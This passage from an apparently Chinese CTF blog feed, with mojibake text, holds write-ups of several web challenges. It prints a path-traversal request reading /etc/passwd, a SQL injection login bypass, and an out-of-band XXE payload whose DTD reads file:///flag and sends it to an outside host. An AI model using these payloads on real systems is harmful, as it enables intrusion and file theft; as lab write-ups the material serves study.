src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829201923198.png"></p><p>å¾¡å‰‘è¿æ¥ä¸‹ç»“æŸã€‚</p><h3 id="è§£æ³•2"><a href="#è§£æ³•2" class="headerlink" title="è§£æ³•2"></a>è§£æ³•2</h3><p>è¿˜å¯ä»¥åœ¨æŠ“ä¸ªå¯¼å‡ºä¸»é¢˜çš„åŒ…</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF-2021-easycms/image-20210829202744885.png"></p><p>è§£ä¸ªç </p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;system&#x2F;tmp&#x2F;theme&#x2F;default&#x2F;123.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯å°†/flagè¿›è¡Œbase64ç¼–ç </p><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L2ZsYWc&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥ä¸‹è½½äº†flag.zipï¼Œæ”¹ä¸‹åç¼€çœ‹ä¸‹å†…å®¹ï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[RootersCTF2019]babyWeb</title>
      <link href="/p/261607162.html"/>
      <url>/p/261607162.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ä¸‡èƒ½å¯†ç ]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-babyWeb/image-20210829192436090.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å¸ƒå°”ç›²æ³¨</p><p>sqlmapå¯ä»¥ç›´æ¥è·‘</p><p>åº“</p><pre class="line-numbers language-none"><code class="language-none">[*] information_schema[*] mysql[*] performance_schema[*] sql_injection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-babyWeb/image-20210829194600643.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RootersCTF2019-babyWeb/image-20210829195032755.png"></p><p>è·‘äº†åŠå¤©å±ç”¨æ²¡æœ‰ï¼Œæ²¡æƒ³åˆ°æœ€åæ˜¯ä¸‡èƒ½å¯†ç ç™»å½•</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1 || 1&#x3D;1 limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[å®‰æ´µæ¯ 2019]iamthinking</title>
      <link href="/p/28867439.html"/>
      <url>/p/28867439.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ååºåˆ—åŒ–|POPé“¾|ThinkPHP]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/image-20210827230722508.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å¼€å±€403ï¼Œæ‰«ç›®å½•æ‰«å‡º<a href="http://www.zip/">www.zip</a></p><p>ThinkPHP6.0</p><p>æœç´¢unserialize</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/image-20210827231136326.png"></p><p>å…¶ä¸­æœ‰ä¸ªparse_urlç»•è¿‡ï¼Œåœ¨<a href="https://syunaht.com/p/2163136062.html#toc-heading-3">åˆ·é¢˜ç¬”è®°:[N1CTF 2018]eating_cms</a>æœ‰å†™ã€‚</p><p>å¤ªç—›è‹¦äº†ï¼Œä»£ç çœ‹åˆ°çœ¼ç›ç—›ã€‚çœ‹äº†åŠå¤©æ€»æ„Ÿè§‰åœ¨ç£¨æ´‹å·¥ï¼Œç®—äº†ï¼Œæˆ‘æ”¾å¼ƒäº†ã€‚</p><p>å·²ç»æœ‰å¸ˆå‚…å†™å¥½äº†ç›¸å…³å·¥å…·</p><p><a href="https://github.com/wh1t3p1g/phpggc">https://github.com/wh1t3p1g/phpggc</a></p><p>ç›´æ¥ç”Ÿæˆä¸‹payloadä¾¿æ˜¯</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-iamthinking/image-20210828214605441.png"></p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>ç†æ¸…æ€è·¯</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava</title>
      <link href="/p/697982602.html"/>
      <url>/p/697982602.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[tomcat|CVE-2014-3574|java|excel]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827182004446.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>éšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶ï¼Œå‘ç°ç±»ä¼¼æ–‡ä»¶åŒ…å«</p><p>å°è¯•</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯»å–æˆåŠŸã€‚</p><p>å°è¯•è¯»å–flagæç¤º</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827182106506.png"></p><p>è¾“å…¥./ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹æŠ¥é”™ï¼Œæµè§ˆå™¨ä¸è¡Œã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827193424815.png"></p><pre class="line-numbers language-none"><code class="language-none">&amp;#47;usr&amp;#47;local&amp;#47;tomcat&amp;#47;webapps&amp;#47;ROOT&amp;#47;WEB-INF&amp;#47;upload&amp;#47;1&amp;#47;12&amp;#47;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥ä¸€ä¸‹<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">HTML Markup</a>æ ‡ç­¾</p><p>æˆ–è€…</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827193851369.png"></p><p>æ‰€ä»¥è·¯å¾„ä¸º</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;upload&#x2F;1&#x2F;12&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ—¢ç„¶æ˜¯<strong>tomcat</strong>ï¼Œç¬¬ä¸€ä¸ªè¦æŸ¥çš„è‡ªç„¶æ˜¯<strong>WEB-INF/web.xml</strong></p><p>è®¿é—®</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>         <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DownloadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>cn.abc.servlet.DownloadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DownloadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/DownloadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>cn.abc.servlet.ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/ListFileServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>cn.abc.servlet.UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/UploadServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œè¿™äº›æ–‡ä»¶éƒ½åœ¨WEB-INF/classesä¸‹</p><p>æ³¨æ„è¿™æ˜¯javaï¼Œ<code>cn.abc.servlet.DownloadServlet</code>è¿™ç§å½¢å¼æ˜¯åŒ…åï¼Œæ‰€ä»¥è·¯å¾„ä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class..&#x2F;..&#x2F;..&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥ç”¨Jd-gui-windowsåç¼–è¯‘ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ideaã€‚</p><p>å¯¹excelè¿›è¡Œå¤„ç†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827200237022.png"></p><p>ç„¶åå°±æ˜¯ç™¾åº¦ä¸‹javaçš„excelç›¸å…³æ¼æ´ï¼Œæœ‰å¾ˆå¤š</p><p>å…·ä½“å¯è§<a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XMLå¤–éƒ¨å®ä½“ï¼ˆXML External Entityï¼ŒXXEï¼‰æ”»å‡»è¯¦è§£</a></p><p>åŠ ä¸ª</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;172.16.173.129&#x2F;penson.dtd&quot;&gt;%remote;%int;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ”¾åˆ°è¿™ä¸ªæ–‡ä»¶é‡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/image-20210827203319860.png"></p><p>excelæ–‡ä»¶åå­—éœ€è¦æ”¹æˆexcel-xxx</p><p>å› ä¸ºæ˜¯å†…ç½‘ç¯å¢ƒï¼Œåœ¨buuä¸Šå¼€ä¸ªlinuxé¶æœºï¼Œç„¶ååˆ›å»ºä¸ªpenson.dtdæ–‡ä»¶ï¼Œæ”¾è¿›å»</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;172.16.173.129:2333?p&#x3D;%file;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åä¸Šä¼ ï¼Œ</p><p>å¾—ï¼Œåˆæ‰“ä¸é€šï¼Œè¯•äº†åŠå¤©éƒ½ä¸è¡Œã€‚</p><p>çœŸæ— è¯­äº†ï¼Œä¸€æ¶‰åŠå†…ç½‘ï¼Œå°±æ‰“ä¸é€šï¼Œè¿™éƒ½ç¬¬ä¸‰å›äº†ã€‚çœŸçš„çƒ¦ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[NPUCTF2020]ezlogin</title>
      <link href="/p/720437907.html"/>
      <url>/p/720437907.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ç™»å½•æ¡†åŠ¨ç”»]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203523313.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>çœ‹äº†ä¸‹ï¼Œç™»å½•éªŒè¯åœ¨static/main.jsé‡Œ</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var current &#x3D; null;document.querySelector(&#39;#username&#39;).addEventListener(&#39;focus&#39;, function(e) &#123;  if (current) current.pause();  current &#x3D; anime(&#123;    targets: &#39;path&#39;,    strokeDashoffset: &#123;      value: 0,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;,    strokeDasharray: &#123;      value: &#39;240 1386&#39;,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;  &#125;);&#125;);document.querySelector(&#39;#password&#39;).addEventListener(&#39;focus&#39;, function(e) &#123;  if (current) current.pause();  current &#x3D; anime(&#123;    targets: &#39;path&#39;,    strokeDashoffset: &#123;      value: -336,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;,    strokeDasharray: &#123;      value: &#39;240 1386&#39;,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;  &#125;);&#125;);document.querySelector(&#39;#submit&#39;).addEventListener(&#39;focus&#39;, function(e) &#123;  if (current) current.pause();  current &#x3D; anime(&#123;    targets: &#39;path&#39;,    strokeDashoffset: &#123;      value: -730,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;,    strokeDasharray: &#123;      value: &#39;530 1386&#39;,      duration: 700,      easing: &#39;easeOutQuart&#39;    &#125;  &#125;);&#125;);function doLogin()&#123;  var username &#x3D; $(&quot;#username&quot;).val();  var password &#x3D; $(&quot;#password&quot;).val();  var token &#x3D; $(&quot;#token&quot;).val();  if(username &#x3D;&#x3D; &quot;&quot; || password &#x3D;&#x3D; &quot;&quot;)&#123;    $(&quot;.msg&quot;).text(&quot;ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º!&quot;);    return;  &#125;  var data &#x3D; &quot;&lt;username&gt;&quot;+username+&quot;&lt;&#x2F;username&gt;&quot;+&quot;&lt;password&gt;&quot;+password+&quot;&lt;&#x2F;password&gt;&quot;+&quot;&lt;token&gt;&quot;+token+&quot;&lt;&#x2F;token&gt;&quot;;    $.ajax(&#123;        type: &quot;POST&quot;,        url: &quot;login.php&quot;,        contentType: &quot;application&#x2F;xml&quot;,        data: data,        anysc: false,        success: function (result, status, xhr) &#123;          if(result &#x3D;&#x3D; &#39;æˆåŠŸ&#39;)&#123;            window.location.href &#x3D; &#39;admin.php&#39;;          &#125;          $(&quot;.msg&quot;).text(result);        &#125;,        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;            $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);        &#125;    &#125;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™åŠ¨ç”»è¿˜è›®ç‚«çš„</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826203824528.png"></p><p>æ˜¯ä»¥è¿™æ ·çš„å½¢å¼ä¼ è¿‡å»çš„ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826204841573.png"></p><p>åŠ ä¸ª<code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>æç¤ºæ ¼å¼é”™è¯¯</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-NPUCTF2020-ezlogin/image-20210826205028810.png"></p><p>è¿˜ä»¥ä¸ºæ˜¯XXEè¯•äº†åŠå¤©ä¸è¡Œï¼Œä¸€çœ‹wpï¼Œå¾—ï¼Œxpathæ³¨å…¥ã€‚</p><p>è™½ç„¶çˆ¬è™«ç”¨è¿‡xpathï¼Œä½†æ²¡æƒ³åˆ°è¿˜èƒ½æ³¨å…¥ã€‚</p><h3 id="XPathæ³¨å…¥"><a href="#XPathæ³¨å…¥" class="headerlink" title="XPathæ³¨å…¥"></a>XPathæ³¨å…¥</h3><blockquote><p>XPathæ²¡æœ‰æ³¨é‡Šä¸€è¯´ï¼Œæ‰€ä»¥æ„é€ çš„payloadè¦æ ¹æ®è¯­å¥è¿›è¡Œé—­åˆ</p></blockquote><p><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">XPath æ³¨å…¥æŒ‡åŒ—</a></p><ul><li><p>å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°</p><p>codepoints-to-string(a, b, c, â€¦)ï¼šå°†æ•°å­— aã€bã€c è½¬ä¸ºå¯¹åº”çš„å­—ç¬¦ï¼Œ Python çš„<code>chr</code>å‡½æ•°ç±»ä¼¼ã€‚</p><p>string-to-codepoints(string)ï¼šä¸ä¸Šé¢çš„ç›¸å</p><p>compare(a, b, rule)ï¼šæ¯”å¤§å°ï¼Œfunc æ˜¯æ¯”è¾ƒå¤§å°çš„è§„åˆ™</p><p>string-join((string, string, â€¦), sep)ï¼šä½¿ç”¨ sep å‚æ•°ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ¥è¿”å› string å‚æ•°æ‹¼æ¥åçš„å­—ç¬¦ä¸²ã€‚</p><p>substring(string, start [,len])ï¼šè¿”å›ä» start ä½ç½®å¼€å§‹çš„æŒ‡å®šé•¿åº¦çš„å­å­—ç¬¦ä¸²ã€‚ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä¸‹æ ‡æ˜¯ 1ã€‚å¦‚æœçœç•¥ len å‚æ•°ï¼Œåˆ™è¿”å›ä»ä½ç½® start åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„å­å­—ç¬¦ä¸²ã€‚</p><p>string-length([string])ï¼šè¿”å›æŒ‡å®šå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚å¦‚æœæ²¡æœ‰ string å‚æ•°ï¼Œåˆ™è¿”å›å½“å‰èŠ‚ç‚¹çš„å­—ç¬¦ä¸²å€¼çš„é•¿åº¦ã€‚</p></li><li><p>å…¶ä»–å‡½æ•°</p><p>count(item[, item1, â€¦])ï¼šè¿”å›èŠ‚ç‚¹çš„æ•°é‡ã€‚</p><p>position()ï¼šè¿”å›å½“å‰æ­£åœ¨è¢«å¤„ç†çš„èŠ‚ç‚¹çš„ index ä½ç½®ã€‚</p><p>last()ï¼šè¿”å›åœ¨è¢«å¤„ç†çš„èŠ‚ç‚¹åˆ—è¡¨ä¸­çš„é¡¹ç›®æ•°ç›®ã€‚</p><p>name([nodeset])ï¼šè¿”å›å½“å‰èŠ‚ç‚¹çš„åç§°æˆ–æŒ‡å®šèŠ‚ç‚¹é›†ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p></li></ul><p>ä¸¾ä¸ªä¾‹å­</p><p>users.xmlï¼š</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>0192023a7bbd73250516f069df18b500<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>jack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1d6c1e168e362bc0092f247399003a88<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token 